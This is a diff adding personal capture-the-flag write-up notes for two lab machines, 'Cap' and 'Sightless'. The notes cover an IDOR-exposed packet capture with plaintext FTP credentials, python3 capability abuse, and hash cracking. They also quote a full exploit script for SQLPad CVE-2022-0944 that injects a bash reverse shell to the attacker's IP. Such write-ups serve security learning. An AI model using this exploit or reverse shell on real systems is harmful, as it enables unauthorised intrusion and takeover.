@@ -931,3 +931,129 @@ Remember the dot before exec an ps1
 ![[Pasted image 20241124173922.png]]
 ![[Pasted image 20241124174034.png]]
 Got the root flag
+
+
+### CAP ✅
+#### Initial access
+I started enumerating the services, I found ports 21,22 and 80 opened
+Lets see what we have in the webpage
+![[Pasted image 20241225185456.png]]Using gobuster didnt found any other directory
+![[Pasted image 20241225191350.png]]
+I also tried the FTP port but anonymous log in is disabled
+One of the options of the page is a Sec snapshot, in which a 5 seconds PCAP is available to download
+![[Pasted image 20241225191725.png]]
+I realized that the data is labeled in the URL, so I tried to exploit IDORs
+And I found the following PCAP
+![[Pasted image 20241225191835.png]]Lets download the PCAP and open it with wireshark
+In the PCAP we have plain creds for the user nathan in the FTP service
+![[Pasted image 20241225192211.png]]
+USER nathan PASS Buck3tH4TF0RM3!
+and we have the user flag in the FTP server
+![[Pasted image 20241225192951.png]]
+![[Pasted image 20241225193005.png]]
+#### Priv Esc
+The same password is used for SSH, so we got a remote connection to machine
+![[Pasted image 20241225193234.png]]
+Did not found nothing using `find` nor `sudo -l`
+I used LinPEAS so is easier, and it found some capabilities on the python3 binary
+![[Pasted image 20241225200015.png]]
+Using GTFOBins I found how to exploit this
+![[Pasted image 20241225200113.png]]
+![[Pasted image 20241225200247.png]]
+
+### Sightless
+#### Initial Access
+![[Pasted image 20241225215318.png]]
+The URL couldnt be resolved since is unknown![[Pasted image 20241225215353.png]]
+So I had to add it to /etc/hosts
+Perfect, now we can access
+![[Pasted image 20241225220128.png]]
+The only thing that caught my attention is this SQLPad
+![[Pasted image 20241225220113.png]]
+After performing some dirsearch and subdomain fuzzing I did not found anything usefull
+In the SQLPad tab I found that we can provide anew connection to a database, so I tried every driver and it seems that snowflake is active and running in the victim machine
+![[Pasted image 20241225222426.png]]
+It seems that this does not lead anywhere
+Looking through the internet for what SQLPad is I found that it has vulnerabilities associated
+![[Pasted image 20241225223148.png]]
+![[Pasted image 20241225223227.png]]
+So I found some exploits for this version
+https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944/blob/master/CVE-2022-0944
+```bash
+#!/bin/bash
+
+# Inform the user to run netcat manually
+echo "Please make sure to start a listener on your attacking machine using the command:"
+echo "nc -lvnp 9001"
+echo "Waiting for you to set up the listener..."
+
+# Pause for confirmation from the user before continuing
+read -p "Press [Enter] when you are ready..."
+
+# Prompt the user for the target server and attacker's IP address
+echo "Please provide the target host (e.g., x.x.com): "; read TARGET
+echo "Please provide your IP address (e.g., 10.10.16.3): "; read REVERSE_IP
+
+# Set reverse port for connection
+REVERSE_PORT=9001
+
+# Prepare the POST data with the payload injected in the 'host' and 'database' fields
+POST_DATA=$(cat <<EOF
+{
+  "name": "divineclown",
+  "driver": "mysql",
+  "data": {
+    "host": "",
+    "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
+  },
+  "host": "",
+  "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
+}
+EOF
+)
+
+# Perform the POST request using curl to trigger the payload on the target server
+curl -i -s -k -X POST -H "Host: $TARGET" -H "Accept: application/json" -H "Content-Type: application/json" -H "Origin: http://$TARGET" -H "Referer: http://$TARGET/queries/new" -H "Connection: keep-alive" --data-binary "$POST_DATA" "http://$TARGET/api/test-connection" > /dev/null
+
+echo "Exploit sent. If everything went well, check your listener for a connection on port $REVERSE_PORT."
+```
+
+Perfect, I will use this to exploit the vulnerability
+![[Pasted image 20241225223931.png]]
+We are in 
+![[Pasted image 20241225224453.png]]
+But it seems like this is a Docker container since I am root but nothing is here
+![[Pasted image 20241225224554.png]]
+![[Pasted image 20241225224622.png]]
+This script is interesting 
+![[Pasted image 20241225225632.png]]
+Another thing founded was the /etc/shadow that has a user called michael 
+Lets see if any of these hashes is a common password
+![[Pasted image 20241225231206.png]]
+Lets use hashcat 
+![[Pasted image 20241225231705.png]]
+Seems that this is not the proper has, so I specified another one for SHA512
+![[Pasted image 20241225232130.png]]
+Done! I Cracked one password
+![[Pasted image 20241225233259.png]]
+![[Pasted image 20241225233349.png]]
+Lets try the passwords in the other services
+For root in SSH did not worked
+![[Pasted image 20241225233806.png]]
+Good, we are in as Michael
+![[Pasted image 20241225233939.png]]
+#### Priv Esc
+At first we do not have anything to leverage
+![[Pasted image 20241225234054.png]]
+We have anohter user called john
+![[Pasted image 20241225234342.png]]
+Using linPEAS found the following
+![[Pasted image 20241225235232.png]]![[Pasted image 20241225235430.png]]
+I had to seek the writeup since I was lost here
+I used the ss command with the following flags
+- t TCP connections
+- n 
+- l All lsitening sockets 
+- p Check PIDs
+![[Pasted image 20241226000513.png]]
+A TERMINAR ES MUY DIFICIL EL PRIV ESC
